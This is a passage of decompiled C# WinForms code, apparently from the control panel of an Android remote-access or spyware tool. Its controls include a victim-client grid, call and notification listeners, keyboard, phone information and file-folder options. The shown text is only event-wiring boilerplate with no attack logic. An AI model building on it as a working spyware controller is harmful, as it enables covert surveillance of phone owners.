			toolStripMenuItem = _ToolStripMenuItem2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator6")]
	internal virtual ToolStripSeparator ToolStripSeparator6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripMenuItem4")]
	internal virtual ToolStripMenuItem ToolStripMenuItem4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem5
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem5_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem5;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem5 = value;
			toolStripMenuItem = _ToolStripMenuItem5;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem6
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem6_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem6 = value;
			toolStripMenuItem = _ToolStripMenuItem6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem7
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem7_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem7;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem7 = value;
			toolStripMenuItem = _ToolStripMenuItem7;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem8
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem8_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem8;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem8 = value;
			toolStripMenuItem = _ToolStripMenuItem8;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem9
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem9_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem9;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem9 = value;
			toolStripMenuItem = _ToolStripMenuItem9;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem10
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem10_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem10;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem10 = value;
			toolStripMenuItem = _ToolStripMenuItem10;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator5")]
	internal virtual ToolStripSeparator ToolStripSeparator5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ExtraToolStripMenuItem")]
	internal virtual ToolStripMenuItem ExtraToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem NotificationListnerToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _NotificationListnerToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = NotificationListnerToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _NotificationListnerToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_NotificationListnerToolStripMenuItem = value;
			toolStripMenuItem = _NotificationListnerToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CallsListnerToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CallsListnerToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CallsListnerToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CallsListnerToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CallsListnerToolStripMenuItem = value;
			toolStripMenuItem = _CallsListnerToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem PhoneInformationToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PhoneInformationToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PhoneInformationToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _PhoneInformationToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_PhoneInformationToolStripMenuItem = value;
			toolStripMenuItem = _PhoneInformationToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator7")]
	internal virtual ToolStripSeparator ToolStripSeparator7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripMenuItem13")]
	internal virtual ToolStripMenuItem ToolStripMenuItem13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem16
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem16_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem16;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem16 = value;
			toolStripMenuItem = _ToolStripMenuItem16;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem17
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem17_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem17;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem17 = value;
			toolStripMenuItem = _ToolStripMenuItem17;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem18
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem18_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem18;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem18 = value;
			toolStripMenuItem = _ToolStripMenuItem18;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem11
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem11_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem11;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem11 = value;
			toolStripMenuItem = _ToolStripMenuItem11;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator8")]
	internal virtual ToolStripSeparator ToolStripSeparator8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem KeyboardToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _KeyboardToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = KeyboardToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _KeyboardToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_KeyboardToolStripMenuItem = value;
			toolStripMenuItem = _KeyboardToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator4")]
	internal virtual ToolStripSeparator ToolStripSeparator4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ClientFolderToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ClientFolderToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ClientFolderToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ClientFolderToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ClientFolderToolStripMenuItem = value;
			toolStripMenuItem = _ClientFolderToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual DrakeUIDataGridView ClientsWindow
	{
		[CompilerGenerated]
		get
		{
			return _ClientsWindow;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellMouseEventHandler value2 = ClientsWindow_CellMouseClick;
			DataGridViewCellEventHandler value3 = ClientsWindow_CellEndEdit;
			DrakeUIDataGridView drakeUIDataGridView = _ClientsWindow;
			if (drakeUIDataGridView != null)
			{
				drakeUIDataGridView.CellMouseClick -= value2;
				drakeUIDataGridView.CellEndEdit -= value3;
			}
			_ClientsWindow = value;
			drakeUIDataGridView = _ClientsWindow;
			if (drakeUIDataGridView != null)
			{
				drakeUIDataGridView.CellMouseClick += value2;
				drakeUIDataGridView.CellEndEdit += value3;
			}
		}
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon3 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon4 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon6
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon6_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon6;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon6 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon6;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon5_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon5 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel8")]
	internal virtual Panel Panel8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon Clients_Btn
	{
		[CompilerGenerated]
		get
		{
			return _Clients_Btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon7_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _Clients_Btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_Clients_Btn = value;
			drakeUIButtonIcon = _Clients_Btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon blockbtn
	{
		[CompilerGenerated]
		get
		{
			return _blockbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon10_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _blockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_blockbtn = value;
			drakeUIButtonIcon = _blockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon Connection_btn
	{
		[CompilerGenerated]
		get
		{
			return _Connection_btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Connection_btn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _Connection_btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_Connection_btn = value;
			drakeUIButtonIcon = _Connection_btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar1_Click_1;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar1;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar1 = value;
			drakeUIAvatar = _DrakeUIAvatar1;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem14
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem14_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem14;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem14 = value;
			toolStripMenuItem = _ToolStripMenuItem14;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer checkupdate
	{
		[CompilerGenerated]
		get
		{
			return _checkupdate;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Checkupdate_Tick;
			System.Windows.Forms.Timer timer = _checkupdate;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_checkupdate = value;
			timer = _checkupdate;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("cliscren")]
	internal virtual DataGridViewImageColumn cliscren
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cliav")]
	internal virtual DataGridViewImageColumn cliav
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cliflg")]
	internal virtual DataGridViewImageColumn cliflg
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cliname")]
	internal virtual DataGridViewTextBoxColumn cliname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clicountry")]
	internal virtual DataGridViewTextBoxColumn clicountry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cliip")]
	internal virtual DataGridViewTextBoxColumn cliip
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("andver")]
	internal virtual DataGridViewTextBoxColumn andver
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("phondmod")]
	internal virtual DataGridViewTextBoxColumn phondmod
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clinoti")]
	internal virtual DataGridViewImageColumn clinoti
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clicalls")]
	internal virtual DataGridViewImageColumn clicalls
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clibtry")]
	internal virtual DataGridViewImageColumn clibtry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cliwifi")]
	internal virtual DataGridViewImageColumn cliwifi
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cliavt")]
	internal virtual DataGridViewTextBoxColumn cliavt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("defcli")]
	internal virtual DataGridViewTextBoxColumn defcli
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("isadmincli")]
	internal virtual DataGridViewImageColumn isadmincli
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clipng")]
	internal virtual DataGridViewTextBoxColumn clipng
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("instdate")]
	internal virtual DataGridViewTextBoxColumn instdate
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker mapworker
	{
		[CompilerGenerated]
		get
		{
			return _mapworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = Mapworker_DoWork_1;
			BackgroundWorker backgroundWorker = _mapworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_mapworker = value;
			backgroundWorker = _mapworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer Statustimer
	{
		[CompilerGenerated]
		get
		{
			return _Statustimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Statustimer_Tick;
			System.Windows.Forms.Timer timer = _Statustimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Statustimer = value;
			timer = _Statustimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel9")]
	internal virtual Panel Panel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("toblocktext")]
	internal virtual DrakeUITextBox toblocktext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar addpo
	{
		[CompilerGenerated]
		get
		{
			return _addpo;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Addpo_Click;
			DrakeUIAvatar drakeUIAvatar = _addpo;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_addpo = value;
			drakeUIAvatar = _addpo;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Label2_MouseDown_1;
			Label label = _Label2;
			if (label != null)
			{
				label.MouseDown -= value2;
			}
			_Label2 = value;
			label = _Label2;
			if (label != null)
			{
				label.MouseDown += value2;
			}
		}
	}

	internal virtual Label bigtitletext
	{
		[CompilerGenerated]
		get
		{
			return _bigtitletext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Bigtitletext_MouseDown;
			Label label = _bigtitletext;
			if (label != null)
			{
				label.MouseDown -= value2;
			}
			_bigtitletext = value;
			label = _bigtitletext;
			if (label != null)
			{
				label.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel10")]
	internal virtual Panel Panel10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel11")]
	internal virtual Panel Panel11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkclearlogs")]
	internal virtual DrakeUICheckBox checkclearlogs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkenablelogs")]
	internal virtual DrakeUICheckBox checkenablelogs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon studiobtn
	{
		[CompilerGenerated]
		get
		{
			return _studiobtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Studiobtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _studiobtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_studiobtn = value;
			drakeUIButtonIcon = _studiobtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon notifiaisbtntop
	{
		[CompilerGenerated]
		get
		{
			return _notifiaisbtntop;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _notifiaisbtntop;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_notifiaisbtntop = value;
			drakeUIButtonIcon = _notifiaisbtntop;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("notificationspanel")]
	internal virtual Panel notificationspanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("activityzpanel")]
	internal virtual DrakeUITitlePanel activityzpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DGVALRTS")]
	internal virtual DataGridView DGVALRTS
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewImageColumn4")]
	internal virtual DataGridViewImageColumn DataGridViewImageColumn4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn3")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel12")]
	internal virtual Panel Panel12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon11
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon11_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon11;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon11 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon11;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon10
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon10_Click_2;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon10;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon10 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon10;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon7
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon7_Click_2;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon7;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon7 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon7;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("serverspanel")]
	internal virtual Panel serverspanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel13")]
	internal virtual Panel Panel13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon serversbtn
	{
		[CompilerGenerated]
		get
		{
			return _serversbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon14_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _serversbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_serversbtn = value;
			drakeUIButtonIcon = _serversbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("checksavepass")]
	internal virtual DrakeUICheckBox checksavepass
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("passtxt")]
	internal virtual DrakeUITextBox passtxt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
